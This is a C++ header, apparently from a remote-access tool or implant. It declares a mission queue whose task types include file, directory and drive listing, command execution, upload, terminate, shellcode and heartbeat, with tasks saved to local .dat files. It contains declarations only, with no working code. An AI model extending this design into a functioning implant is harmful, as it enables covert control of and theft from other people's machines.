#pragma once

#include "public.h"

#include <iostream>

#include <vector>

#include <windows.h>


using namespace std;


#define MISSION_TYPE_FILE		1
#define MISSION_TYPE_DIR		2
#define MISSION_TYPE_DRIVE		3
#define MISSION_TYPE_CMD		4
#define MISSION_TYPE_UPLOAD		5

#define COMMAND_TYPE_TERMINATE	6
#define COMMAND_TYPE_SHELLCODE	7
#define COMMAND_TYPE_HEARTBEAT	8

#define MISSION_ETEM_SIZE		1024

#define FILEMISSION_FILENAME		"fileMission.dat"

#define CMDMISSION_FILENAME			"cmdMission.dat"

#pragma pack()

typedef struct  
{
	int type;
	char key[UUID_LENGTH];
	char value[MISSION_ETEM_SIZE - sizeof(DWORD) - UUID_LENGTH];
}MISSION_ITEM;


#pragma pack()

class DataMission {

public:
	DataMission();

	DataMission(int type);

	virtual ~DataMission();

	int getFileMission();

	int getFileMission_test();

	int getCmdMission_test();

	int updateMission();

	int getCmdMission();
	int keepCmdMission(string uuid, string data, int type);
	int removeCmdMission(string key);

	int keepFileMission(string uuid, string data, int type);

	int removeFileMission(string key);

private:
	CRITICAL_SECTION m_cs;

	vector< MISSION_ITEM> m_missions;

	string m_mfn;

	string m_cmd;
};


char* buildCmd(CONST char* data, int datalen, int type);

char* buildCmd2(CONST char* data1, int datalen1, int type1, const char* data2, int datalen2, int type2);